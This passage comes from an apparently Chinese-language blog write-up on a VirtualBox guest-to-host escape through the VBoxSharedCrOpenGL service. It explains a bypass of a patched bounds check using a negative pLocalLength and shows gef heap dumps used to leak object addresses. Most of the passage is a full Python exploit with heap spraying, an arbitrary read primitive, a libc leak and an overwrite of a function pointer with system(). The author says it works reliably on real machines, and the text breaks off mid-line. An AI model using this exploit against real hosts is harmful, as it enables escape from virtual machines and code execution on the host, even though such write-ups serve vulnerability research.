pState-&gt;pDispatchTbl-&gt;ShaderSource(shader, 1, (const char**)ppStrings, 0);</span><br><span class="line"></span><br><span class="line">    crFree(ppStrings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这版本的源码在第54行前后都加了越界检查，因此不能使用之前的方法来进行越界。但是patch过后允许我们输入一个负数的<code>pLocalLength</code>比如<code>0xfffff233</code>来绕过检查，这里可以传入两个<code>pLocalLength</code>，第一个为负数<code>0xfffff233</code>，解析负数<code>pLocalLength</code>之后会把pos指针指向buf的前面，通过第二个<code>pLocalLength</code>可以来控制越界写换行符的范围。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>剩下就是调试堆布局和指针偏移的问题了，发现难点主要是在第一步泄露<code>CRConnection</code>地址的时候如何确定越界读的偏移，这里给点小tips。<br>我们可以下断点在0xf2c36的位置，然后查看rbx的值，这时候对应的就是越界读的基地址。<br>用gef的命令<code>tele $rbx</code>一直往下翻到0x820的位置可以看到类似的结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007fece46780e8</span>│+<span class="number">0x0828</span>: <span class="number">0x00000000000009e5</span></span><br><span class="line"><span class="number">0x00007fece46780f0</span>│+<span class="number">0x0830</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece46780f8</span>│+<span class="number">0x0838</span>: <span class="number">0x00007fece4678ad0</span>  →  <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x00007fece4678100</span>│+<span class="number">0x0840</span>: <span class="number">0x0000000000000015</span></span><br><span class="line"><span class="number">0x00007fece4678108</span>│+<span class="number">0x0848</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678110</span>│+<span class="number">0x0850</span>: <span class="number">0x00000000ffffffff</span></span><br><span class="line"><span class="number">0x00007fece4678118</span>│+<span class="number">0x0858</span>: <span class="number">0x00007fecebfef238</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678120</span>│+<span class="number">0x0860</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678128</span>│+<span class="number">0x0868</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p><code>0x9e5</code>是CRClient结构体的size，第一个指针指向<code>0x0000000100000000</code>，正是<code>CRConnection</code>指针，再下面一个qword 0x15是该client的id。<br>观察<code>CRConnection</code>指针就能看到<code>CRConnection</code>的字段了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tele  <span class="number">0x00007fece4678ad0</span></span><br><span class="line"><span class="number">0x00007fece4678ad0</span>│+<span class="number">0x0000</span>: <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x00007fece4678ad8</span>│+<span class="number">0x0008</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678ae0</span>│+<span class="number">0x0010</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678ae8</span>│+<span class="number">0x0018</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678af0</span>│+<span class="number">0x0020</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678af8</span>│+<span class="number">0x0028</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b00</span>│+<span class="number">0x0030</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b08</span>│+<span class="number">0x0038</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x00007fece4678b10</span>│+<span class="number">0x0040</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b18</span>│+<span class="number">0x0048</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b20</span>│+<span class="number">0x0050</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b28</span>│+<span class="number">0x0058</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b30</span>│+<span class="number">0x0060</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b38</span>│+<span class="number">0x0068</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b40</span>│+<span class="number">0x0070</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b48</span>│+<span class="number">0x0078</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b50</span>│+<span class="number">0x0080</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b58</span>│+<span class="number">0x0088</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b60</span>│+<span class="number">0x0090</span>: <span class="number">0x0003e8000003e800</span></span><br><span class="line"><span class="number">0x00007fece4678b68</span>│+<span class="number">0x0098</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b70</span>│+<span class="number">0x00a0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b78</span>│+<span class="number">0x00a8</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x00007fece4678b80</span>│+<span class="number">0x00b0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b88</span>│+<span class="number">0x00b8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678b90</span>│+<span class="number">0x00c0</span>: <span class="number">0x00007fecebd856a0</span>  →   push rbp [void *(*)(CRConnection *) Alloc]</span><br><span class="line"><span class="number">0x00007fece4678b98</span>│+<span class="number">0x00c8</span>: <span class="number">0x00007fecebd85550</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678ba0</span>│+<span class="number">0x00d0</span>: <span class="number">0x00007fecebd85c00</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678ba8</span>│+<span class="number">0x00d8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678bb0</span>│+<span class="number">0x00e0</span>: <span class="number">0x00007fecebd85590</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678bb8</span>│+<span class="number">0x00e8</span>: <span class="number">0x00007fecebd85730</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678bc0</span>│+<span class="number">0x00f0</span>: <span class="number">0x00007fecebd85af0</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678bc8</span>│+<span class="number">0x00f8</span>: <span class="number">0x00007fecebd854f0</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678bd0</span>│+<span class="number">0x0100</span>: <span class="number">0x00007fecebd851b0</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678bd8</span>│+<span class="number">0x0108</span>: <span class="number">0x00007fecebd85220</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678be0</span>│+<span class="number">0x0110</span>: <span class="number">0x00007fecebd851e0</span>  →   push rbp</span><br><span class="line"><span class="number">0x00007fece4678be8</span>│+<span class="number">0x0118</span>: <span class="number">0x00007fecebd85260</span>  →   mov eax, DWORD PTR [rip+<span class="number">0x2766fa</span>]        <span class="comment"># 0x7fecebffb960</span></span><br><span class="line"><span class="number">0x00007fece4678bf0</span>│+<span class="number">0x0120</span>: <span class="number">0x0000000000000010</span></span><br><span class="line"><span class="number">0x00007fece4678bf8</span>│+<span class="number">0x0128</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c00</span>│+<span class="number">0x0130</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c08</span>│+<span class="number">0x0138</span>: <span class="number">0x0000001300200000</span></span><br><span class="line"><span class="number">0x00007fece4678c10</span>│+<span class="number">0x0140</span>: <span class="number">0x0000000000000015</span></span><br><span class="line"><span class="number">0x00007fece4678c18</span>│+<span class="number">0x0148</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c20</span>│+<span class="number">0x0150</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c28</span>│+<span class="number">0x0158</span>: <span class="number">0x00007fece4678d10</span>  →  <span class="number">0x0000000000000000</span> [uint8_t * pHostBuffer]</span><br><span class="line"><span class="number">0x00007fece4678c30</span>│+<span class="number">0x0160</span>: <span class="number">0x0000000000000800</span></span><br><span class="line"><span class="number">0x00007fece4678c38</span>│+<span class="number">0x0168</span>: <span class="number">0x00007fece46780f0</span>  →  <span class="number">0x0000000000000000</span> [_crclient * pClient]</span><br><span class="line"><span class="number">0x00007fece4678c40</span>│+<span class="number">0x0170</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c48</span>│+<span class="number">0x0178</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c50</span>│+<span class="number">0x0180</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c58</span>│+<span class="number">0x0188</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c60</span>│+<span class="number">0x0190</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c68</span>│+<span class="number">0x0198</span>: <span class="number">0x00007fece4678c68</span>  →  [loop detected]</span><br><span class="line"><span class="number">0x00007fece4678c70</span>│+<span class="number">0x01a0</span>: <span class="number">0x00007fece4678c68</span>  →  <span class="number">0x00007fece4678c68</span>  →  [loop detected]</span><br><span class="line"><span class="number">0x00007fece4678c78</span>│+<span class="number">0x01a8</span>: <span class="number">0x0000000900000001</span></span><br><span class="line"><span class="number">0x00007fece4678c80</span>│+<span class="number">0x01b0</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x00007fece4678c88</span>│+<span class="number">0x01b8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c90</span>│+<span class="number">0x01c0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678c98</span>│+<span class="number">0x01c8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678ca0</span>│+<span class="number">0x01d0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fece4678ca8</span>│+<span class="number">0x01d8</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>能够正确泄露<code>CRConnection</code>和<code>CRClient</code>的地址以及对应id过后，再确定关键成员变量的偏移，接下来的步骤就和原exp完全一样了。这里给出自己其中一个版本的exp，需要注意是调试发现直接重新启动虚拟机和从快照启动会导致不一样的堆布局，总共调好了两个不同的exp，下面给出的exp是用来打直接启动的。用两台真机测试过都稳定弹计算器，要是现场演示应该也没有问题吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line">sys.path.append(os.path.abspath(os.path.dirname(__file__)) + <span class="string">'/lib'</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hgcm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_oob_read</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">        + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, offset)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, CR_GETUNIFORMLOCATION_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">        + <span class="string">'LEET'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input(<span class="string">"break"</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.spray_num = <span class="number">0x2000</span></span><br><span class="line">        self.spray_size = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc1</span><span class="params">(self)</span>:</span></span><br><span class="line">        msg = make_oob_read(<span class="number">0x300</span>) </span><br><span class="line">        leak = crmsg(client1, msg, <span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poc2</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># trigger bug to enlarge a CRVBOXSVCBUFFER_t</span></span><br><span class="line">        msg = (pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0X41414141</span>, <span class="number">1</span>))</span><br><span class="line">        msg += <span class="string">"\x00\x00\x00"</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        msg += <span class="string">'aaaa'</span> </span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, CR_SHADERSOURCE_EXTEND_OPCODE)</span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#shader</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">2</span>) <span class="comment">#count</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#hasNoLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0xfffff233</span>)<span class="comment">#pLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0x500</span>)<span class="comment">#pLocalLength</span></span><br><span class="line">        ret = crmsg(self.client1, msg, self.spray_size)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.client1 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client1)</span><br><span class="line">        self.fill_holes()</span><br><span class="line">        self.leak_stuff()</span><br><span class="line">        self.spray_CRVBOXSVCBUFFER()</span><br><span class="line">        self.enlarge_victim_size()</span><br><span class="line">        self.found_corrupted_buf()</span><br><span class="line">        self.write_fake()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fill_holes</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x238</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x9d0</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>): alloc_buf(self.client1, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stuff</span><span class="params">(self)</span>:</span></span><br><span class="line">        clients = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">            client = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">            set_version(client)</span><br><span class="line">            clients.append(client)</span><br><span class="line">        victim1 = clients[<span class="number">0x10</span>]</span><br><span class="line">        hgcm_disconnect(victim1)</span><br><span class="line">        victim2 = clients[<span class="number">0x11</span>]</span><br><span class="line">        hgcm_disconnect(victim2)</span><br><span class="line">        bp()</span><br><span class="line">        msg = make_oob_read(<span class="number">0x838</span>+<span class="number">0x10</span>)</span><br><span class="line">        leak = crmsg(self.client1, msg, <span class="number">0x238</span>)</span><br><span class="line">        self.pConn, = unpack(<span class="string">"&lt;Q"</span>, leak[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">        print(<span class="string">"pConn#0: %#x"</span> % self.pConn)</span><br><span class="line">        self.pClient = self.pConn<span class="number">-0x9e0</span></span><br><span class="line">        print(<span class="string">"pClient#0: %#x"</span> % self.pClient)</span><br><span class="line">        self.client2 = clients[<span class="number">18</span>]</span><br><span class="line">        print(<span class="string">"client2: %#x"</span> % self.client2)</span><br><span class="line">        print(clients)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spray_CRVBOXSVCBUFFER</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.bufs = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.spray_num):</span><br><span class="line">            self.bufs.append(alloc_buf(self.client1, self.spray_size, <span class="string">"A"</span>*self.spray_size))</span><br><span class="line">        self.hole_pos = self.spray_num - <span class="number">0x10</span></span><br><span class="line">        hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [self.bufs[self.hole_pos], <span class="string">"A"</span>*<span class="number">0x1000</span>, <span class="number">1337</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enlarge_victim_size</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># trigger bug to enlarge a CRVBOXSVCBUFFER_t</span></span><br><span class="line">        msg = (pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0X41414141</span>, <span class="number">1</span>))</span><br><span class="line">        msg += <span class="string">"\x00\x00\x00"</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        msg += <span class="string">'aaaa'</span> </span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, CR_SHADERSOURCE_EXTEND_OPCODE)</span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#shader</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">2</span>) <span class="comment">#count</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>) <span class="comment">#hascNoLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0xfffff233</span>)<span class="comment">#pLocalLength</span></span><br><span class="line">        msg += pack(<span class="string">"&lt;I"</span>, <span class="number">0x100</span>)</span><br><span class="line">        ret = crmsg(self.client1, msg, self.spray_size)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_corrupted_buf</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Finding corrupted buffer..."</span>)</span><br><span class="line">        found = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.spray_num):</span><br><span class="line">            <span class="keyword">if</span> i != self.hole_pos:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [self.bufs[i], self.spray_size, <span class="number">0</span>, <span class="string">""</span>]) </span><br><span class="line">                <span class="keyword">except</span> IOError:</span><br><span class="line">                    print(<span class="string">"[+] Found corrupted id: 0x%x"</span> % self.bufs[i])</span><br><span class="line">                    found = self.bufs[i]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found &lt; <span class="number">0</span>:</span><br><span class="line">            exit(<span class="string">"[-] Error could not find corrupted buffer."</span>)</span><br><span class="line">        id_str = <span class="string">"%08x"</span> % found</span><br><span class="line">        self.victim_id = int(id_str.replace(<span class="string">"00"</span>, <span class="string">"0a"</span>), <span class="number">16</span>)</span><br><span class="line">        print(<span class="string">"[+] Victim id: %#x"</span> % self.victim_id)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_fake</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.fake_id = <span class="number">0x13371337</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fake = pack(<span class="string">"&lt;IIQQQ"</span>, self.fake_id, <span class="number">0x238</span>, self.pConn, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [self.victim_id, <span class="number">0x0a0a010a</span>, self.spray_size + <span class="number">0x10</span>, fake])</span><br><span class="line">            print(<span class="string">"[+] Exploit successful."</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            exit(<span class="string">"[-] Failed"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_read</span><span class="params">(self, addr, n)</span>:</span></span><br><span class="line">        hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [self.fake_id, <span class="number">0x238</span>, OFFSET_CONN_HOSTBUF, pack(<span class="string">"&lt;Q"</span>, addr)])</span><br><span class="line">        hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [self.fake_id, <span class="number">0x238</span>, OFFSET_CONN_HOSTBUFSZ, pack(<span class="string">"&lt;I"</span>, n)])</span><br><span class="line">        res, sz = hgcm_call(self.client2, SHCRGL_GUEST_FN_READ, [<span class="string">"A"</span>*<span class="number">0x1000</span>, <span class="number">0x1000</span>])</span><br><span class="line">        print(<span class="string">"[+] do read at %#x, %d"</span> % (addr, n))</span><br><span class="line">        <span class="keyword">return</span> res[:n]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_read64</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        res = self.do_read(addr, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> unpack(<span class="string">"&lt;Q"</span>, res)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd = <span class="string">"gnome-calculator"</span></span><br><span class="line">        <span class="comment"># Overwrite CRConnection-&gt;disconnect to system, &amp;CRConnection to cmd string.</span></span><br><span class="line">        hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0x13371337</span>, <span class="number">0x238</span>, <span class="number">0x118</span>, pack(<span class="string">"&lt;Q"</span>, self.system)])</span><br><span class="line">        hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_BUFFER, [<span class="number">0x13371337</span>, <span class="number">0x238</span>, <span class="number">0</span>, cmd])</span><br><span class="line">        <span class="comment"># trigger disconnect</span></span><br><span class="line">        hgcm_call(self.client2, SHCRGL_GUEST_FN_READ, [<span class="string">"A"</span>*<span class="number">0x1000</span>, <span class="number">0x1000</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_addrs</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.leak_cr = self.do_read64(self.pConn + <span class="number">0xc0</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] leak_cr: %#x"</span> % self.leak_cr</span><br><span class="line">        self.cr_base = self.leak_cr - <span class="number">0x11a6a0</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] cr_base: %#x"</span> % self.cr_base</span><br><span class="line">        dlopen_got = self.cr_base + <span class="number">0x376458</span></span><br><span class="line">        dlopen_libc = self.do_read64(dlopen_got)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] dlopen: %#x"</span> % dlopen_libc </span><br><span class="line">        self.libc = dlopen_libc - <span class="number">0x3f1fe0</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] libc: %#x"</span> % self.libc</span><br><span class="line">        self.system = self.libc + <span 